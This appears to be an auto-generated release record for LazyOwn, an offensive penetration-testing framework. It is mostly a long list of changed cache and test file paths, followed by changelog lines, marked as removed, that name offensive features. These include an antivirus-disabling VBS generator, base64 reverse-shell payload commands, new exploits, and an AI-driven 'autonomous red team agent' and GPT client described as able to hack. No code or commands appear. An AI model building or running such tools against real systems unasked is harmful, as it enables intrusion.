modules/graphify-out/cache/bd62a8a248b08fb9ca0eb1a063d56d6894c7bda4e944bbd6d59958995ed2a469.json - modules/graphify-out/cache/be43e925d3c08d53a7b1ec16ca45406873ea1d5c23211b750ad121a598e34c52.json - modules/graphify-out/cache/c0141cc20d3a31cffb86a15e540a5841ef0c61ba47c30592c63e75f0d3dbd765.json - modules/graphify-out/cache/c06d0c705f8f90394ca7085acb09163547cf5ffa94b2c669cff12171776118f0.json - modules/graphify-out/cache/c09b785530f780284c4a037eec27baa6f7ec32aff4ae6fa70a24b77fb51b0faf.json - modules/graphify-out/cache/c124403728199f515b9ac7876e1f73cd1771e876617ce7caec289a58c6ef6a39.json - modules/graphify-out/cache/c18b9fcf7cd951d04bcb318a3b0f6cb95167add7717bc375414944aa0a693972.json - modules/graphify-out/cache/c25f3433aac86587b2181688afaad2ac21dd57835dc1114b959ef5c84dcba139.json - modules/graphify-out/cache/c28d6f5d3fa68bc2670117e5e87cb58937de2b5fe97e93f4473a6103851d7b1a.json - modules/graphify-out/cache/c433ed6d78ad35c2701a439df1d6b7ed1e659c087f51fda6cdc0f9c43e632d72.json - modules/graphify-out/cache/c63ad41bcafdab0d41440aa0c5151147c59118cef56d1a208a5de175768ae3cf.json - modules/graphify-out/cache/ca44d706b30cc9b0142af6801a1c20cb1427ca88cc95fe7539526810fc86f8c7.json - modules/graphify-out/cache/cd15886a1da91111a71b3d9dbbea2ca89670204da62c11906f5ae75b6da32472.json - modules/graphify-out/cache/cd65efedb86f15ea7d52dc0112a424c44b60d3739dd30334f96e596c7bc1ad58.json - modules/graphify-out/cache/cd999221c11cc82527bddb8ac2ac6ddb9170e852a58bf749a1ee28d6966ac313.json - modules/graphify-out/cache/ce01861e6dbe2c0f8fc4f50044b1558965db96970e25098bae3c497035da908f.json - modules/graphify-out/cache/cfbcd0136de144066266d4e693cba9f0d1d86359970a6a9b690049afc6d72880.json - modules/graphify-out/cache/cfc035ecc1d70457c9b1869e84c609b6b96674931a904742f41210b072060f16.json - modules/graphify-out/cache/cfda4436e68a22c8d7fb180154e83392b87cd3768c7da0170b5b9c62f8aee728.json - modules/graphify-out/cache/d12dccf07d58d7c0a2b5ea5b6aa821aa419fdc8b34a48939ebf9c565bc439551.json - modules/graphify-out/cache/d2886bb1b2c2a702c60f220715404b4d543642ffd3f33963e0f82a4c63ac2e3c.json - modules/graphify-out/cache/d28bb51bb1ce8d20a6f3137ad35b14ffbc83b7364d6b7bb743933d0d922d332e.json - modules/graphify-out/cache/d3bd2be384f28e6ec932b36487bdcca4c5966b8cd696d16f8b67ae59b7471f47.json - modules/graphify-out/cache/d4848d774c2bc6e6c64f455b197ff2daf4fffb8fd262cd64a1dcb6b4bc9a725d.json - modules/graphify-out/cache/d584bce9d8acb11ef59c235ac7d4d8d804745882d2dad48da56a538cf5a6a552.json - modules/graphify-out/cache/d66147bf0f176df4d3b9dd65c8fce0193265160bc7f08689e90d35c9b5416a17.json - modules/graphify-out/cache/d767e59fd8986c7e4e13b38bf5d766e3940d0b8346b27e29b4db5bb39cb1adfa.json - modules/graphify-out/cache/d7c1275fbbe4449a0a3b42ebbabada2a51a2821ea80e2845e9ac8cc691f0c82c.json - modules/graphify-out/cache/dad8ff12deeab5bb23754cc74ce4063f26039b3a1e0e49c4a971f1a3af238d01.json - modules/graphify-out/cache/db20ee6958777ee0ad40668f2c5778a97dd313484b2c7522f120fd9544d7b475.json - modules/graphify-out/cache/dbe8a98f87d00483d3d6531215c0acc33f6fc7b9ec8b01a778c446b54fe70d4c.json - modules/graphify-out/cache/dd677b1ba4f494ee843125b5cc6e9b3e1821334a75f4ad95ee40e5fcb4986c1c.json - modules/graphify-out/cache/de6345cb6f6f2c9121358c6890b656ddff1fde9eb9cfb59527162d791eb9437b.json - modules/graphify-out/cache/df58a7d2670a99066cd4d31e2cc33d93f45a588667563b29d5176fe63245eafb.json - modules/graphify-out/cache/e00df8727fe4ec9c5ee699e063e744f97d5fa5a1e77d6cfcc697e3eb7108a193.json - modules/graphify-out/cache/e103b4a2d44b8535783229f5717e0f7d7c2f9f65e99c5f19078a0732e4153912.json - modules/graphify-out/cache/e2c629e494b277e3fa004d432969b5f98aa49dda09e6e4ae7b6884a96495d339.json - modules/graphify-out/cache/e8c82b59e3c0550f3af525820fd60aa4081a043dae5f2e1a7d3f13c8291030f0.json - modules/graphify-out/cache/ed6748ad0384ed2ed9d66bc72ba2c133e184ead3dd93d6e377156701c0c6b60a.json - modules/graphify-out/cache/f11472dd845abcbad58d1d6a11b65ea9d3d218577027608dedb4c8080d1bed16.json - modules/graphify-out/cache/f1e7a02e36872b9fd6dd295039307e6dc9ae183ee6e88cbb4dac1b64df6577ac.json - modules/graphify-out/cache/f8d2fc24e6fc86802b4e91296690ab3c8b31bbbfe70698532c05a90aa3bd486d.json - modules/graphify-out/cache/fd2a60045d1899d661c492a7d4e5eefd1d010691f80aafcab0be5abf01348cdc.json - modules/graphify-out/cache/fdcbc4cf5a17a1e3ce16cd550c9a16f7a6f12cb07fca92a0ad5bee7f77ed5470.json - modules/graphify-out/cache/ff7170035f673bef01ade88b0768aa07502c88767c2db95705408cef8d005e16.json - skills/lazyown_mcp.py - static/security_dashboard.png - tests/test_command_palette.py - tests/test_credentials_rotation.py - tests/test_doctor.py - tests/test_recommendation.py\nDeleted file(s):\n- graphify-out/.graphify_ast.json - graphify-out/.graphify_cached.json - graphify-out/.graphify_detect.json - graphify-out/.graphify_labels.json - graphify-out/.graphify_uncached.txt\nCreated file(s):\n- cli/doctor.py - cli/recommendation.py - cli/recommendation_signals.py - graphify-out/cache/031e8f5e7fd55b2c0db4c2eedcc353706daed78f368eed868c8c58262e9bef73.json - graphify-out/cache/04bad0a88c727f42f0d20fb8568e421bf0a19054604393072252a993708eb0ae.json - graphify-out/cache/23be7133ea3a999fa1ba4eee004c3ed9ccf79d2be0ae3c5e4761d71c9a131672.json - graphify-out/cache/40affef8fcb928a95814d54e4761c1d20c73b8b069d123854202a085978b40fd.json - graphify-out/cache/4b84bc2aa814babd8e815b504e53e9005c2d89315e981d180cab334a054eb2aa.json - graphify-out/cache/5d18cc768ae8452cb2f7821534d9c7dbda66b413d1d9b8ae15ca1f85ac4dfc14.json - graphify-out/cache/66ec95e768e3ba39b34da750ff88c2e4d08e421838c9e07a3ae9395ce831de65.json - graphify-out/cache/6aa5631748379a7f618876aa4320012003d28540750b4bef4ce6c3b917284879.json - graphify-out/cache/7d93d0c6635336c7c1a2c62b309cb1071cbf4c43957a9c2002a9fa14906fa71b.json - graphify-out/cache/99e73fb02571dc27ae93de6dfde129b06256c53f86320d3d9c54ddc5b3914264.json - graphify-out/cache/a537209ca6c5d7e0456518e28cf51ed5d7dbbdf61e5647f4969af23a4cd22864.json - graphify-out/cache/b140a501a24a87dd076d954dce95dcaa9c8ca5639af84abd452a773c6af76802.json - graphify-out/cache/b1b8b49c63cccae65dd7154c8384f4e065b9edf7991ca23cf107643982121359.json - graphify-out/cache/b3475d3ecad80b81a44b9270d10c58f5b2dc2fc9de164c9a120315868362dd92.json - graphify-out/cache/b7ed71cf39ffac46a64c7f5b44309f8d43f272e8faa25e3e67e56d040a5d35fd.json - graphify-out/cache/c7b82847a2203ae17333916ea320365096bf37a779d506fe8326e5a08adf36c2.json - graphify-out/cache/c91f76f3f004483a8ea2e0dd0b562a2923ef81a1fef1849e8ee30e570b3ed6e7.json - graphify-out/cache/d00abbda2dd000914d645445fd3c05eca5ddd4a0eb971159dc32175c1ba38bda.json - graphify-out/cache/d8bf7baa7848f9988de7120fd0a0e116d2029f877e6f68014c78f9ca1b8a4e69.json - graphify-out/cache/e44e6c4320409546a5d72187c366aaf2e0bff56a08768f682ce2b506e54c2109.json - graphify-out/cache/f2b386b2d70fcd89d02e3507c83d8087ca38c7d4c80f1aeea37b323855f2cc40.json - graphify-out/cost.json - modules/graphify-out/cache/002c68a5d8bd90a7afd87aece874d680919300f1749db5b5d36df429a570a90b.json - modules/graphify-out/cache/00ecc49cc353dd16819ae15aef9b3b46680fc675f7112a7b52a1b39a98ec8e86.json - modules/graphify-out/cache/04327718c76fb2a3741aa47d73ca88e78c3a71962f698a8d488f7fb73b35cb4e.json - modules/graphify-out/cache/04e1013cdaaa16e48fe97ce0da745d838b2963087cbe18df326273a1b067a67b.json - modules/graphify-out/cache/06af6e35a790c5008b76448abd7b073236aff4b25883e11489625ae0910fff1c.json - modules/graphify-out/cache/0bbe929d6546a52becc46c9e4b875f0fe6c2ab826bd8d06a20e859d27d3d4828.json - modules/graphify-out/cache/0f44dd3aed01b0cfd9edb77f3e14f479ffd7e67b1f31cc4bf9197a99d61e7e3d.json - modules/graphify-out/cache/1240e2f3c7f6db76f66c31f4c8f5212917c8d52a5ff5026a29be33173df21a08.json - modules/graphify-out/cache/15f5ea411edceabbb87bc68a151f14985dadbd6ecf1c3f58a0591af7d03b7172.json - modules/graphify-out/cache/1602bb923409cf9c74a2b063edef8968f719667512fa8888dc1ab713d239ad19.json - modules/graphify-out/cache/16229114939ee96a45da798388d20c45cade6f8ed4247be055c02bf69237e256.json - modules/graphify-out/cache/173ef6ac8ff8e0e09843ccd09ca73ab42f0db8d44a07bb24a3307c6e81abeabd.json - modules/graphify-out/cache/17810fa1289c575546ab2f1f5005444c63cadd9ea8a021ea8d68656c0b033fa6.json - modules/graphify-out/cache/17ada399ac59a81a4f5cbea33085c6277c456fc94a8e10e8dd5eabf5041f6775.json - modules/graphify-out/cache/1a775d2b403859e0d87a57cec46001b501e465c9ab3939df5b3e75f510801e1a.json - modules/graphify-out/cache/1a98e41dbc590c7859599703cb0bd0c5d9dc8baa5c216a37e0c5d6f5fd9f1c64.json - modules/graphify-out/cache/1ad87e74340150a792513e9bfeb89b0a10609ab8e0a8a92eb13b9b44ebbdb932.json - modules/graphify-out/cache/1af842a157aa6f74edc018441862e964dbcc1a39ca5dcdbdcda42d004569078a.json - modules/graphify-out/cache/1b85e94aedc492581a7ac727dabcd66947ac78a0272d4d3c771bdda076f171e9.json - modules/graphify-out/cache/1da6c32dc3f515e67cbc40d431154b41a6f60a6d1aa851d4f7ced9ddd6f102f6.json - modules/graphify-out/cache/1eebbfedaded8299f50771805bc0f2f8e4efd5c8159a0bbd8ee6eca1c712e27a.json - modules/graphify-out/cache/217095166ef54685f378475211949aea1a81e07542ebd435521d86f6fd181b4c.json - modules/graphify-out/cache/22c1a469eca462e83d029729c7e8fa7df8a3d2a968f8c71aa5fec80fa8f5ce36.json - modules/graphify-out/cache/28e9a0072539dbbecdd2a26918822d7a9d929269b57586b148957c43847f5bf7.json - modules/graphify-out/cache/2b430cf200f59cd303c10b8b6ecceac7bde2302d6b4bc88a82128fe00d633aa3.json - modules/graphify-out/cache/2d373033a4141265a1e0448fadce895b2158259f937064acce1366f21591967e.json - modules/graphify-out/cache/2f85d60d9e180d6f3933eecec738aceaf0656d4202424471a3309550a03acbc4.json - modules/graphify-out/cache/34322fbee784e41a6ca90964b027e1177ab762054ad8f995267bc1bae96d20af.json - modules/graphify-out/cache/34e46208e6f2f6b066dfb94a608e37ddec0f0b0a90bb083a78402a65fd969368.json - modules/graphify-out/cache/36b60cb588f4ff96b1f280370779ea4b9ef9f8cb1f162cf514e2acf862015ce9.json - modules/graphify-out/cache/38a3aac38041440f46bb2dceb0fb4ce47e5bc603635d52ae8195c5779d9ab2ea.json - modules/graphify-out/cache/3a7357d10f228b14fc3db9417d131551780d12e6fedc090d70cc98386b59411c.json - modules/graphify-out/cache/3a923525e21418fde5a5a93675c08ac383531190b9db8fcf42b31049d642c788.json - modules/graphify-out/cache/408177679da228f94487d47ca786bebedfe5650e7b67c53647b5b0597b14a68a.json - modules/graphify-out/cache/4197cba86ac7f19d2d5652c06730c0507f7153afb6b037b3ec1d42e6f16702e2.json - modules/graphify-out/cache/42b220d6c2c6e2efb968f7b7106c83ec3b9568d304bd411f57d2f67210e9d8d3.json - modules/graphify-out/cache/4322c36d359a6273a03dff0ac40cfec544b9eaa0a9f10a8d5295bc70023ae244.json - modules/graphify-out/cache/4519cda64701c6b26d6213e40745fb8aa06b4fc830a68f2e5c761a3151db30f0.json - modules/graphify-out/cache/466ee6e152eff9e68a42b04282828e29436a0a4b0243f5c7cdc70387858b4bd3.json - modules/graphify-out/cache/46b21d7e09994fc4234c13ddefe7266a190741000946fe68c6a8aa1472f68761.json - modules/graphify-out/cache/47d02fd7f0d7d47f4519d6a2fccd886c790cf6da80bbce6cff39f54847f4aacf.json - modules/graphify-out/cache/49a0bc55f8774a8a305e18e08d994b1be9b880c46360fffb09035cf5a71643a0.json - modules/graphify-out/cache/4aebc0020b1578b3fefab2ca3718cc844c5e7e3b0d88073af2e0dd8f2372c299.json - modules/graphify-out/cache/5071df243916840111a4022b5cadf74118d4654ded1e74b79ec9a8c38e06c5b0.json - modules/graphify-out/cache/510f0ffd637767b9f5188118ccf29dd139304e993becb31f3cf4c052524c98b2.json - modules/graphify-out/cache/5116e72308d4d31d070b11859c20610557340cbde74a2858f3a795b68528084f.json - modules/graphify-out/cache/52d705625d1dcd901f35270bae14d6831f6d9bc62331336cfbf2dcef8fc8ba2e.json - modules/graphify-out/cache/5361d757cad9d249b369d58b5cfa1d35ef5c3eaee89aff34138795b4a2d6d47e.json - modules/graphify-out/cache/56fc6f753a4e13a8de4907c6d27b5a513ecc864cf1ac965f60f7b922f790b198.json - modules/graphify-out/cache/58887cfe1a9520d0dab433302a97e848be70a3469e75716ef9924c7443e0c436.json - modules/graphify-out/cache/58d021c03e8752214f5ad6c2e01e31a31eb20d79452c054ee36d740b63ba5ac5.json - modules/graphify-out/cache/5afbe82cd60e8cabb41b500ed732de33ce3246431d7addbea7e780e7019ec3e1.json - modules/graphify-out/cache/5d73e2649547a6a099ba96902d6eb53a112f75e19cf5f85f7cb3d94672bb9b17.json - modules/graphify-out/cache/5efb0ea8dd163daa68c4d21ae159d96133fd2805e5df747b679ed05f3a8de356.json - modules/graphify-out/cache/605d1819d9abcbb225765dcb0779a31f49c6c5c69a29ca76abb5417924a1cccc.json - modules/graphify-out/cache/6066176534f92b2d7ae9045e222aba593e5f8286efc739b18d254934924208de.json - modules/graphify-out/cache/63408142131bd158b5200b62cd9b0f2f7d03b1e39b9c6034bb17b2824131d4d5.json - modules/graphify-out/cache/63b8d6f1458df5081248e316c32985ccc7a6e135d4b714a30b8960b97a29408e.json - modules/graphify-out/cache/648c948b138f7141cb6b3a0c819f16469230c393eb9c0ccd0316b3d7eac04150.json - modules/graphify-out/cache/69e5415663b5b7861dff3baebb776e4644d550bafb3ac5823fb0cad966c72e17.json - modules/graphify-out/cache/6ca1d7759f39555e2e00db547b4c52f65c20f262b8eb94a664bb8dc13b21e772.json - modules/graphify-out/cache/6d9c6072f81245d266b72ccb16e821f978975a575dfe7d4372f808cb444630e4.json - modules/graphify-out/cache/6f29d7b81fabdaa02e59340afae00093b9a994e2181e31cbc786ec30a2ff2406.json - modules/graphify-out/cache/6f5eae5ce5dd716ae47df4fd51c3ff69f27a553cc376c4bb0945624f1a643eb2.json - modules/graphify-out/cache/71a18dadbb78437aee707cb826c56fa10e169d2c281d2a4e1e7794d3266f3247.json - modules/graphify-out/cache/72872a4a27189f9b4707600eabe2895375a74d4b8a210c2dfee6981375ae3e0e.json - modules/graphify-out/cache/7471e366c1dc5e3edc6a1d31bbc6ca925dbe6b92eceef31dfe4b699da561daf6.json - modules/graphify-out/cache/7bde5bac4df2b23b2697bfb85cec8f53979059c5879845ce005f9d837ced4589.json - modules/graphify-out/cache/7d8e453d67d061bad9f84bd293152bff1eb4050a123fb85150df76118289b3ad.json - modules/graphify-out/cache/7e3596a9864b7c26b0d8aba0a4cb3b69eb67495239f205f49bbe772c160132ca.json - modules/graphify-out/cache/805702d3ee3179d7bbaec8d0c954befdbad0afb0f74bd49b8c6c634a9d1c8302.json - modules/graphify-out/cache/823023774e52e16043875084edfef93f5444300b93c89796075f0b71a036b67a.json - modules/graphify-out/cache/839a2edd861eeec008b44eb434f7197440b8e5ef3019dc8ca3fbb221b5f667b3.json - modules/graphify-out/cache/83eb1a5626da3cdb6d06d6f465e2cb97dbf900e6f54310c57ad5ae14963bc1fd.json - modules/graphify-out/cache/850851aa15fe06a5cdaf8b176788b39fbe3863d774da28ed2663d40898ca8808.json - modules/graphify-out/cache/86eab46102bd9380bb82a5481c2497e2b6062b9c0ab9de9bc8ffd42950140898.json - modules/graphify-out/cache/881d78fe853507992f05a39b625f00c75cb5df82f4524d56ccf97c3611f39671.json - modules/graphify-out/cache/889a916fa16398f5b5e7503ef1fa72b90a3bb5c73e5ded81e5e4032292214406.json - modules/graphify-out/cache/88cc7289fb8df07ebca345b22be4489a0c2c56f1b6fa747ad7feede29fc31e5e.json - modules/graphify-out/cache/8b9702b858995529aab6ca6b346f8c5db0d2fcb9f73ba3caf2897bed0529db80.json - modules/graphify-out/cache/8e0ca4cce67e3edd49950a43810731da6d146ba0e69424a784a06589d72aa1df.json - modules/graphify-out/cache/8e9691ab5ed837d3d651c72008d750fdc3235afe43a63c359b662efacaa57758.json - modules/graphify-out/cache/90c3c081d15ce2c80c1dc125a6c2d83d308b4b82ed2d829f40da7f5fa24f1a11.json - modules/graphify-out/cache/92396e6b4f0beae5ac18a178a76037224fd6b2c7fbec2201a3d2faf5f234785c.json - modules/graphify-out/cache/92f411f6b57e381b051cfdd964707b9f57c2b4a78923b247a6203cf2af6f66a0.json - modules/graphify-out/cache/93ce0702839c90b93232b3b7486b2caefe685ef922d7f01605a84c57b35b410d.json - modules/graphify-out/cache/93eadc5de363a15c3280189388ae9454b7f21e4d7137fa9a35804ff41fe2873b.json - modules/graphify-out/cache/945449a4a92bf55c447b3d284f80111a0e8fcafa1c30f93861f48353992c5e9d.json - modules/graphify-out/cache/972f2e035d7e88101a4124b2751451024b3991b02a9b5faeb6b9d6fd07098ea2.json - modules/graphify-out/cache/98feacb28ac6c89a88c44d7d71a79b659076fe2b3d47d116d2378fb231fc3364.json - modules/graphify-out/cache/9a8747718e6c012ac452e62c4e44f065d1647ea2c112c818e2ccc44d833ef60d.json - modules/graphify-out/cache/9f46ac40b755548247f580ff2e653d4fc6d80bf01b55fb3611337672e760ccc3.json - modules/graphify-out/cache/a119edad95d9de167fd5a7d3167274c56134af46ad7737470038003942325fad.json - modules/graphify-out/cache/a2049963b5043ba8f0b3df0cea49f957dc4f66c08dd94a6d7138bb9aa55935d2.json - modules/graphify-out/cache/a2226de55076d9bd8fc98ac2568afa72afafdcf961907ce2efde2a6d29db7811.json - modules/graphify-out/cache/a369d58a9bbe61e59fa17a6c82f207db975b78aa5af7dc8e3c156194eaf00102.json - modules/graphify-out/cache/a7ee090c2c61ca65818136a592229be8ec4b94b3f0f5a1126aea845fff23cec1.json - modules/graphify-out/cache/a84ecb42b3a272f3380a3126aed625ce2e4abbf176e0a1b2c357c178d2f9dbb1.json - modules/graphify-out/cache/a908428c0934cec0a41ae0f1e1a3104a3333681e6a4e6eaaccb76be693b4b4b9.json - modules/graphify-out/cache/a923eebc79af97ccd47a94b6ebd44a092032e8c69317ecf6c77f3b47f2043f0a.json - modules/graphify-out/cache/a94463fd86743d98314e7b977a80dd7a68e4c78957dfe219d0b6436d44935449.json - modules/graphify-out/cache/ab92ec10c9d627d4ffa11eddc486cd4e418bbe612f8baa2f947db376a294c0d4.json - modules/graphify-out/cache/ad6c9a117bcdab8183df904bf0707e4b10d685268301a2f8616370f591612db4.json - modules/graphify-out/cache/adb64c1eb2481ad46c63b879cd45483d8fd50970486258405f15e23359472c6b.json - modules/graphify-out/cache/ae40bf729592bcc763d6b6c6c2bc74f09f1d60900b4fb259c149049a1a4879e2.json - modules/graphify-out/cache/af84c676ec6acda789d2aeebfa8c83cb1055533517afa3ce871b8028b19f611b.json - modules/graphify-out/cache/af85fd6a9f2a66ed659ec6fc14279b22604a5e8d742eee22652b97f571f1e277.json - modules/graphify-out/cache/b1cbaa758bad3be21f364504c35744c832752a0958105efbd2c5de684009ebbb.json - modules/graphify-out/cache/b2d37ed63d870a5cbb825120781e370e0c8eebef5cd34e8119bb6350bfa03c7f.json - modules/graphify-out/cache/b453a2de799ff1d64b1f0ab50b1a658262da4854c918c4693e1d6b245891bbbc.json - modules/graphify-out/cache/b4ee618517fc3b534a44e61447f7a48250faa687cd51eae9cc71b5a9ba0938f7.json - modules/graphify-out/cache/b63a601002d9cd33a15547f866e591e44c513f3b8a26c26ff7d2337dd1c66fe9.json - modules/graphify-out/cache/b65522ef72d7fbf8f6ff9d75ef63de89d2b5100368981a5d3e9d3d14a19c01b8.json - modules/graphify-out/cache/b6cb63e710ddd5fc625bc67429a5964229a65c3e3a9879e676a8260bac7784ee.json - modules/graphify-out/cache/bbe55f18365550f595b32e2654ac15a2bde025baf73d01c139e80fbb6c0b1b27.json - modules/graphify-out/cache/bd62a8a248b08fb9ca0eb1a063d56d6894c7bda4e944bbd6d59958995ed2a469.json - modules/graphify-out/cache/be43e925d3c08d53a7b1ec16ca45406873ea1d5c23211b750ad121a598e34c52.json - modules/graphify-out/cache/c0141cc20d3a31cffb86a15e540a5841ef0c61ba47c30592c63e75f0d3dbd765.json - modules/graphify-out/cache/c06d0c705f8f90394ca7085acb09163547cf5ffa94b2c669cff12171776118f0.json - modules/graphify-out/cache/c09b785530f780284c4a037eec27baa6f7ec32aff4ae6fa70a24b77fb51b0faf.json - modules/graphify-out/cache/c124403728199f515b9ac7876e1f73cd1771e876617ce7caec289a58c6ef6a39.json - modules/graphify-out/cache/c18b9fcf7cd951d04bcb318a3b0f6cb95167add7717bc375414944aa0a693972.json - modules/graphify-out/cache/c25f3433aac86587b2181688afaad2ac21dd57835dc1114b959ef5c84dcba139.json - modules/graphify-out/cache/c28d6f5d3fa68bc2670117e5e87cb58937de2b5fe97e93f4473a6103851d7b1a.json - modules/graphify-out/cache/c433ed6d78ad35c2701a439df1d6b7ed1e659c087f51fda6cdc0f9c43e632d72.json - modules/graphify-out/cache/c63ad41bcafdab0d41440aa0c5151147c59118cef56d1a208a5de175768ae3cf.json - modules/graphify-out/cache/ca44d706b30cc9b0142af6801a1c20cb1427ca88cc95fe7539526810fc86f8c7.json - modules/graphify-out/cache/cd15886a1da91111a71b3d9dbbea2ca89670204da62c11906f5ae75b6da32472.json - modules/graphify-out/cache/cd65efedb86f15ea7d52dc0112a424c44b60d3739dd30334f96e596c7bc1ad58.json - modules/graphify-out/cache/cd999221c11cc82527bddb8ac2ac6ddb9170e852a58bf749a1ee28d6966ac313.json - modules/graphify-out/cache/ce01861e6dbe2c0f8fc4f50044b1558965db96970e25098bae3c497035da908f.json - modules/graphify-out/cache/cfbcd0136de144066266d4e693cba9f0d1d86359970a6a9b690049afc6d72880.json - modules/graphify-out/cache/cfc035ecc1d70457c9b1869e84c609b6b96674931a904742f41210b072060f16.json - modules/graphify-out/cache/cfda4436e68a22c8d7fb180154e83392b87cd3768c7da0170b5b9c62f8aee728.json - modules/graphify-out/cache/d12dccf07d58d7c0a2b5ea5b6aa821aa419fdc8b34a48939ebf9c565bc439551.json - modules/graphify-out/cache/d2886bb1b2c2a702c60f220715404b4d543642ffd3f33963e0f82a4c63ac2e3c.json - modules/graphify-out/cache/d28bb51bb1ce8d20a6f3137ad35b14ffbc83b7364d6b7bb743933d0d922d332e.json - modules/graphify-out/cache/d3bd2be384f28e6ec932b36487bdcca4c5966b8cd696d16f8b67ae59b7471f47.json - modules/graphify-out/cache/d4848d774c2bc6e6c64f455b197ff2daf4fffb8fd262cd64a1dcb6b4bc9a725d.json - modules/graphify-out/cache/d584bce9d8acb11ef59c235ac7d4d8d804745882d2dad48da56a538cf5a6a552.json - modules/graphify-out/cache/d66147bf0f176df4d3b9dd65c8fce0193265160bc7f08689e90d35c9b5416a17.json - modules/graphify-out/cache/d767e59fd8986c7e4e13b38bf5d766e3940d0b8346b27e29b4db5bb39cb1adfa.json - modules/graphify-out/cache/d7c1275fbbe4449a0a3b42ebbabada2a51a2821ea80e2845e9ac8cc691f0c82c.json - modules/graphify-out/cache/dad8ff12deeab5bb23754cc74ce4063f26039b3a1e0e49c4a971f1a3af238d01.json - modules/graphify-out/cache/db20ee6958777ee0ad40668f2c5778a97dd313484b2c7522f120fd9544d7b475.json - modules/graphify-out/cache/dbe8a98f87d00483d3d6531215c0acc33f6fc7b9ec8b01a778c446b54fe70d4c.json - modules/graphify-out/cache/dd677b1ba4f494ee843125b5cc6e9b3e1821334a75f4ad95ee40e5fcb4986c1c.json - modules/graphify-out/cache/de6345cb6f6f2c9121358c6890b656ddff1fde9eb9cfb59527162d791eb9437b.json - modules/graphify-out/cache/df58a7d2670a99066cd4d31e2cc33d93f45a588667563b29d5176fe63245eafb.json - modules/graphify-out/cache/e00df8727fe4ec9c5ee699e063e744f97d5fa5a1e77d6cfcc697e3eb7108a193.json - modules/graphify-out/cache/e103b4a2d44b8535783229f5717e0f7d7c2f9f65e99c5f19078a0732e4153912.json - modules/graphify-out/cache/e2c629e494b277e3fa004d432969b5f98aa49dda09e6e4ae7b6884a96495d339.json - modules/graphify-out/cache/e8c82b59e3c0550f3af525820fd60aa4081a043dae5f2e1a7d3f13c8291030f0.json - modules/graphify-out/cache/ed6748ad0384ed2ed9d66bc72ba2c133e184ead3dd93d6e377156701c0c6b60a.json - modules/graphify-out/cache/f11472dd845abcbad58d1d6a11b65ea9d3d218577027608dedb4c8080d1bed16.json - modules/graphify-out/cache/f1e7a02e36872b9fd6dd295039307e6dc9ae183ee6e88cbb4dac1b64df6577ac.json - modules/graphify-out/cache/f8d2fc24e6fc86802b4e91296690ab3c8b31bbbfe70698532c05a90aa3bd486d.json - modules/graphify-out/cache/fd2a60045d1899d661c492a7d4e5eefd1d010691f80aafcab0be5abf01348cdc.json - modules/graphify-out/cache/fdcbc4cf5a17a1e3ce16cd550c9a16f7a6f12cb07fca92a0ad5bee7f77ed5470.json - modules/graphify-out/cache/ff7170035f673bef01ade88b0768aa07502c88767c2db95705408cef8d005e16.json - tests/test_credentials_rotation.py - tests/test_doctor.py - tests/test_recommendation.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 04 jun 2026 21:35:56 -04 \n\n Hora: 1780623356
 
-### Added
 
-- add forticlient CVE-2026-25089
-- add animated splash overlay for first-run experience
-- add tui_theme command logic with cycle/prev/reset
-- add solarized, monokai, gruvbox, high_contrast themes
-- add cli/style semantic token layer over themes
-- add prev/next command-chain primitive + CLAUDE.md tech-debt law
-- add blacksandbeacon lazyaddon with Linux BOF support
-- new CLAUDE md FILE
-- Merge pull request #138 from grisuno/feature/lazyllmchat-assistant
-- add interactive LLM chatbot module and addon
-- new features
-- feat: Claude Code-style harness layer for LazyOwn MCP
-- Add files via upload
-- Add files via upload
-- Merge pull request #137 from grisuno/feat/toposwarm-addon
-- feat: online feedback loop for TopoSwarm routing (RL from user signal)
-- Merge pull request #136 from grisuno/feat/toposwarm-addon
-- feat: toposwarm lazyaddon — autonomous red team agent driven by TopoSwarm
-- Merge pull request #135 from grisuno/feat/toposwarm-addon
-- feat: TopoSwarm local brain — fallback when Claude Code / cloud APIs unavailable
-- Merge pull request #134 from grisuno/feat/toposwarm-addon
-- Add files via upload
-- feat: add TopoSwarm AI router addon for LazyOwn MCP
-- Merge pull request #133 from grisuno/feature/expand-cloud-rag-stealth-2106303999655273923
-- feat
-- new commands https://www.youtube.com/@KillerMonkyRecordz
-- refactor and new features
-- new payloads in winbase64payloads
-- add cmd2 to install.sh
-- feat(cambio en el versionamiento semantico): se agregan release y patch
-- feat(mejorando el tipo): cambio en el script CHANGELOG.sh
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 new fancy proompt :) 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New command launchpad to recon Linux OS 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New Machine, New Session, New Look, New functions, New tools, New CVEs, NEW VERSION 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 new commands rulencode, urldecode, y lynis documented at COMMANDS.md 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 new commands documented at COMMANDS.md, now implement autocomplete at hashcat, more soon :) 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 new commands documented at COMMANDS.md
-- 👽 new commands documented in COMMANDS.md or README.md and more documentation of the proyect thanks to readmineitor.py :D comming soon their own repo
-- 👽 new machine magic gardens insane machine because resource was pwned and sea not was released yet
-- 👽 new tools for pwntomate :D
-- 👽 new command img2cookie :)
-- 👽 new machine comprezzor.htb
-- 👽 new script readmeneitor req updated
-- 👽 new script readmeneitor to help me update the readme xD
-- 👽 new command ssh 22 and if u have file sessions/credentials.txt this will open ssh conection :)
-- 👽 new machine compiled :)
-- 👽 new command disableav to create a aav.vbs to disable av if it's possible :)
-- 👽 new brothers commands, LazyOwn> winbase64payload and asprevbase64 👽
-- feat: somo testing and alias now you can run gpt alias :D
-- feat: Now the GPT Client use Llama 70B and now can hack :)
-- feat: more time to the nmap to finished and pyautomate autostart
-- some new attacks exploits and new menu to download resources and exploits :D new msf autoroute :D
-- some new attacks exploits and new menu to download resources adn exploits :D
-- some new attacks
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new command getnpusers
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new command chisel to run chisel as server before run download_resource command
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new arguments :) -c command ex ping
